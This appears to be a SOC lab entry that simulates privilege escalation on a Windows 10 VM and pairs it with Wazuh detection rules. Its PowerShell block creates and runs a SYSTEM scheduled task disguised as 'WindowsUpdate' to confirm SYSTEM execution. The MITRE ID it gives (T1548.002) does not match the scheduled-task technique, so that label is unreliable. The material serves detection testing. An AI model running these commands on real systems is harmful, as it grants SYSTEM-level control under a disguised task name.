# Attack 05 — Privilege Escalation via Scheduled Task

## Overview

|Field|Details|
|-|-|
|MITRE ID|T1548.002|
|Tactic|Privilege Escalation|
|Severity|Critical|
|Tool|schtasks.exe|
|Wazuh Rule|100006 — Level 12|
|Target|Windows 10 VM|

## Commands

### Windows VM — PowerShell as Administrator

```powershell
# Create scheduled task as SYSTEM
schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c whoami > C:\\SOC-Lab\\output.txt" /sc once /st 00:00 /ru SYSTEM /f

# Execute task
schtasks /run /tn "WindowsUpdate"

# Verify SYSTEM execution
Start-Sleep -Seconds 3
type C:\\SOC-Lab\\output.txt
# Expected: nt authority\\system

# Cleanup
schtasks /delete /tn "WindowsUpdate" /f
```

## Detection

* **Rule ID:** 100006, 100013 — Level 12-14
* **EID:** 4698 (Task Created), Sysmon EID 1
* **Dashboard Search:** schtasks OR WindowsUpdate

